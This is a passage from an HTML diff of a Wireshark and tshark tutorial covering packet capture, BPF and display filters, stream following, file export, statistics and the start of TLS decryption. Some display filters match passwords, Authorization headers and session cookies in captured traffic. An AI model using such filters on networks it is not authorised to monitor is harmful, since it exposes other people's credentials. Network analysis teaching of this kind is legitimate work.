+            <p><strong>Why Wireshark?</strong> It supports 2000+ protocols, has powerful filtering capabilities, can decrypt encrypted traffic (with keys), and provides deep inspection of every layer from Ethernet to application data. Essential for network forensics, malware analysis, pentesting, and understanding how networks work!</p>
+
+            <h5>Installation & Interface</h5>
+            <div class="code">
+# Wireshark is pre-installed on Kali Linux<br>
+wireshark<br><br>
+
+# Or install on other systems:<br>
+sudo apt install wireshark&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Debian/Ubuntu<br>
+sudo yum install wireshark&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# RedHat/CentOS<br>
+brew install wireshark&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# macOS<br><br>
+
+# Command-line version (tshark):<br>
+tshark --version</div>
+            <p><strong>Beginner's Explanation:</strong></p>
+            <ul>
+                <li><strong>wireshark:</strong> Opens GUI interface for interactive packet capture and analysis</li>
+                <li><strong>tshark:</strong> Command-line version for scripting and automation (we'll cover this later)</li>
+                <li><strong>Why both?</strong> GUI for deep analysis and learning, CLI for automated processing and remote servers</li>
+            </ul>
+
+            <h5>Starting a Capture</h5>
+            <div class="code">
+# 1. Launch Wireshark GUI<br>
+wireshark<br><br>
+
+# 2. Select interface (eth0, wlan0, etc.)<br>
+# 3. Click blue shark fin to start capture<br>
+# 4. Do your network activity (browse websites, run scans, etc.)<br>
+# 5. Click red square to stop capture<br>
+# 6. Save capture: File → Save As → capture.pcap<br><br>
+
+# Capture from command line (tshark):<br>
+sudo tshark -i eth0 -w capture.pcap&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture to file<br>
+sudo tshark -i eth0 -c 100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture 100 packets<br>
+sudo tshark -i eth0 -a duration:60&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture for 60 seconds<br>
+sudo tshark -i eth0 -f "port 80"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture with filter</div>
+            <p><strong>Flag Explanations:</strong></p>
+            <ul>
+                <li><strong>-i INTERFACE:</strong> Capture from specific network interface (eth0, wlan0, any)</li>
+                <li><strong>-w FILE:</strong> Write captured packets to file (creates .pcap file)</li>
+                <li><strong>-c COUNT:</strong> Stop after capturing COUNT packets</li>
+                <li><strong>-a duration:N:</strong> Auto-stop after N seconds (useful for scheduled captures)</li>
+                <li><strong>-f FILTER:</strong> <strong>Capture filter</strong> (BPF syntax) - filters DURING capture (reduces file size)</li>
+            </ul>
+
+            <h5>Capture Filters vs Display Filters</h5>
+            <p><strong>Critical Distinction:</strong> Wireshark has TWO types of filters that work completely differently!</p>
+            <div class="code">
+# CAPTURE FILTERS (Applied DURING capture - uses BPF syntax):<br>
+# Set before starting capture, cannot be changed during capture<br>
+# Syntax: host, port, tcp, udp, src, dst, and, or, not<br><br>
+
+host 192.168.1.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture only traffic to/from this IP<br>
+port 80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture only HTTP traffic<br>
+tcp port 443&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture only HTTPS traffic<br>
+src host 10.10.10.5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture only from source IP<br>
+dst port 53&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture only to destination port 53 (DNS)<br>
+host 192.168.1.1 and port 80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture HTTP traffic to/from specific IP<br>
+not broadcast and not multicast&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Exclude broadcast/multicast traffic<br>
+tcp[13] & 2 != 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture only TCP SYN packets<br><br>
+
+# DISPLAY FILTERS (Applied AFTER capture - uses Wireshark syntax):<br>
+# Applied to already captured packets, can be changed anytime<br>
+# Much more powerful and flexible than capture filters!<br><br>
+
+ip.addr == 192.168.1.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Show traffic to/from this IP<br>
+tcp.port == 80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Show HTTP traffic<br>
+http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Show only HTTP packets<br>
+http.request.method == "POST"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Show only HTTP POST requests<br>
+tcp.flags.syn == 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Show TCP SYN packets<br>
+dns.qry.name contains "google"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Show DNS queries for google<br>
+frame.len > 1000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Show packets larger than 1000 bytes</div>
+            <p><strong>When to Use Which?</strong></p>
+            <ul>
+                <li><strong>Capture Filters:</strong> Use when you know EXACTLY what traffic you want BEFORE starting (reduces file size)</li>
+                <li><strong>Display Filters:</strong> Use AFTER capture to analyze specific traffic (doesn't affect capture file)</li>
+                <li><strong>Best Practice:</strong> Capture everything (no capture filter), then use display filters for analysis</li>
+            </ul>
+
+            <h5>Essential Display Filters</h5>
+            <div class="code">
+# Basic Protocol Filters:<br>
+http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# HTTP traffic<br>
+https&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# HTTPS traffic (encrypted)<br>
+dns&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# DNS queries/responses<br>
+tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# TCP packets<br>
+udp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# UDP packets<br>
+icmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# ICMP (ping)<br>
+arp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# ARP requests/responses<br>
+ftp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# FTP traffic<br>
+ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# SSH traffic<br>
+telnet&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Telnet (unencrypted!)<br>
+smtp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Email (SMTP)<br><br>
+
+# IP Address Filters:<br>
+ip.addr == 10.10.10.5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Traffic to/from this IP<br>
+ip.src == 192.168.1.10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Traffic FROM this source IP<br>
+ip.dst == 8.8.8.8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Traffic TO this destination IP<br>
+!(ip.addr == 192.168.1.1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Exclude this IP<br><br>
+
+# Port Filters:<br>
+tcp.port == 445&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# SMB traffic<br>
+udp.port == 53&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# DNS<br>
+tcp.dstport == 443&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# HTTPS (destination port)<br>
+tcp.srcport == 1234&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# From source port 1234<br><br>
+
+# HTTP-Specific Filters:<br>
+http.request&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# HTTP requests only<br>
+http.response&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# HTTP responses only<br>
+http.request.method == "GET"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# GET requests<br>
+http.request.method == "POST"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# POST requests<br>
+http.request.uri contains "admin"&nbsp;&nbsp;&nbsp;# URLs containing "admin"<br>
+http.host == "example.com"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Requests to specific host<br>
+http.cookie contains "session"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Cookies with "session"<br>
+http.response.code == 200&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# HTTP 200 OK responses<br>
+http.response.code == 404&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# HTTP 404 errors<br>
+http.response.code >= 400&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# All HTTP errors (4xx, 5xx)<br>
+http.user_agent contains "curl"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Specific user agent<br><br>
+
+# DNS Filters:<br>
+dns.qry.name == "example.com"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# DNS query for domain<br>
+dns.qry.type == 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# A records (IPv4)<br>
+dns.qry.type == 28&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# AAAA records (IPv6)<br>
+dns.flags.response == 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# DNS responses only<br><br>
+
+# TCP Flag Filters:<br>
+tcp.flags.syn == 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# SYN packets (connection start)<br>
+tcp.flags.ack == 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# ACK packets<br>
+tcp.flags.reset == 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# RST packets (connection reset)<br>
+tcp.flags.fin == 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# FIN packets (connection close)<br>
+tcp.flags == 0x002&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# SYN flag only<br>
+tcp.flags == 0x012&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# SYN+ACK<br>
+tcp.flags == 0x018&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# PSH+ACK (data transmission)<br><br>
+
+# Advanced Filters:<br>
+frame.len > 1000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Large packets (> 1000 bytes)<br>
+tcp.analysis.retransmission&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# TCP retransmissions (network issues)<br>
+tcp.analysis.duplicate_ack&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Duplicate ACKs (packet loss)<br>
+tcp.stream eq 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# First TCP conversation<br>
+tcp.stream eq 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Second TCP conversation<br>
+frame.time_delta > 5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Packets with > 5 sec gap (delays)<br><br>
+
+# String Matching:<br>
+tcp contains "password"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Packets containing "password"<br>
+http contains "Authorization"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# HTTP auth headers<br>
+frame contains "admin"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Any packet with "admin"<br>
+data contains 50:41:53:53&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Hex search (PASS in ASCII)<br><br>
+
+# Combining Filters:<br>
+http and ip.addr == 10.10.10.5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# HTTP from specific IP<br>
+tcp.port == 445 and ip.src == 192.168.1.10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# SMB from source IP<br>
+(http.request.method == "POST") and (http contains "password")&nbsp;&nbsp;# POST with password<br>
+dns or http or https&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Multiple protocols<br>
+!(arp or icmp)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Exclude ARP and ICMP</div>
+            <p><strong>Filter Syntax Tips:</strong></p>
+            <ul>
+                <li><strong>Comparison:</strong> == (equals), != (not equals), > (greater), &lt; (less), >= (greater/equal), &lt;= (less/equal)</li>
+                <li><strong>Logical:</strong> and, or, not, ! (or use &&, ||, !)</li>
+                <li><strong>Membership:</strong> in { value1, value2 } - e.g., tcp.port in {80 443 8080}</li>
+                <li><strong>String matching:</strong> contains, matches (regex)</li>
+                <li><strong>Parentheses:</strong> Group conditions for complex filters</li>
+            </ul>
+
+            <h5>Follow Streams - Reconstruct Communication</h5>
+            <div class="code">
+# Follow TCP Stream:<br>
+# Right-click packet → Follow → TCP Stream<br>
+# Shows entire conversation in ASCII/HEX<br><br>
+
+# Follow UDP Stream:<br>
+# Right-click packet → Follow → UDP Stream<br><br>
+
+# Follow HTTP Stream:<br>
+# Right-click packet → Follow → HTTP Stream<br>
+# Shows full HTTP request + response<br><br>
+
+# Command-line (tshark):<br>
+tshark -r capture.pcap -z follow,tcp,ascii,0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Follow TCP stream 0<br>
+tshark -r capture.pcap -z follow,tcp,hex,1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Follow stream 1 in hex<br>
+tshark -r capture.pcap -z follow,udp,ascii,0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Follow UDP stream</div>
+            <p><strong>Why Follow Streams?</strong> Packets are fragmented - one HTTP request might span 10 packets. "Follow Stream" reassembles the entire conversation so you can read it like a chat transcript. Perfect for reading HTTP requests, FTP credentials, extracted files, etc.</p>
+
+            <h5>Export Objects - Extract Files from Traffic</h5>
+            <div class="code">
+# GUI: File → Export Objects → HTTP/SMB/TFTP/etc.<br>
+# Extracts files transferred over these protocols<br><br>
+
+# Export HTTP objects (images, downloads, etc.):<br>
+File → Export Objects → HTTP → Save All<br><br>
+
+# Export SMB objects (files shared via SMB):<br>
+File → Export Objects → SMB<br><br>
+
+# Command-line (tshark):<br>
+tshark -r capture.pcap --export-objects http,./exported_files/<br>
+tshark -r capture.pcap --export-objects smb,./smb_files/</div>
+            <p><strong>Real-World Use:</strong> Capture malware downloads, extract images from web browsing, recover files from SMB shares, analyze transferred documents!</p>
+
+            <h5>Statistics & Analysis Tools</h5>
+            <div class="code">
+# Protocol Hierarchy (Statistics → Protocol Hierarchy):<br>
+# Shows breakdown of all protocols in capture<br>
+# Example: HTTP: 45%, DNS: 10%, TLS: 30%, etc.<br><br>
+
+# Conversations (Statistics → Conversations):<br>
+# Shows all communication pairs (who talked to who)<br>
+# Tabs: Ethernet, IPv4, IPv6, TCP, UDP<br><br>
+
+# Endpoints (Statistics → Endpoints):<br>
+# Lists all IPs/MACs and their traffic volume<br><br>
+
+# IO Graphs (Statistics → I/O Graphs):<br>
+# Visual timeline of traffic (packets/bytes over time)<br>
+# Can graph multiple filters simultaneously<br><br>
+
+# Command-line (tshark):<br>
+tshark -r capture.pcap -qz io,phs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Protocol hierarchy<br>
+tshark -r capture.pcap -qz conv,tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# TCP conversations<br>
+tshark -r capture.pcap -qz endpoints,ip&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# IP endpoints</div>
+            <p><strong>Why Use This?</strong> Get a bird's-eye view of network activity. "Who's talking to who?" "What protocols are used most?" "Which IP sent the most data?" Perfect for finding anomalies!</p>
+
+            <h5>Expert Information - Find Problems</h5>
+            <div class="code">
+# Analyze → Expert Information (or bottom-left colorful button)<br><br>
+
+# Error levels:<br>
+# 🔴 Error: Serious problems (malformed packets, checksum errors)<br>
+# 🟡 Warning: Suspicious activity (retransmissions, duplicate ACKs)<br>
+# 🔵 Note: Informational (connection established, zero window)<br>
+# 💬 Chat: Normal events (TCP handshakes, HTTP requests)<br><br>
+
+# Common Expert Info:<br>
+"TCP Previous segment not captured"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Packet loss detected<br>
+"TCP Retransmission"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Packet was resent<br>
+"TCP Dup ACK"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Duplicate acknowledgment<br>
+"TCP Window Full"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Receiver buffer full<br>
+"TCP Zero Window"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Receiver can't accept more data<br>
+"Connection reset"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# TCP RST sent<br>
+"Malformed Packet"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Invalid protocol data</div>
+            <p><strong>Why Expert Info?</strong> Wireshark automatically analyzes captures and flags potential problems. Great starting point for troubleshooting!</p>
+
+            <h5>Decrypting SSL/TLS Traffic</h5>
+            <div class="code">
+# Method 1: Use pre-master secret (from browser/client):<br>
+# 1. Set environment variable BEFORE starting browser:<br>
+export SSLKEYLOGFILE=/tmp/ssl_keys.log<br>
+chromium-browser&nbsp;&nbsp;&nbsp;&nbsp;# Or firefox<br><br>
+
+# 2. Browse HTTPS sites (keys logged to file)<br>
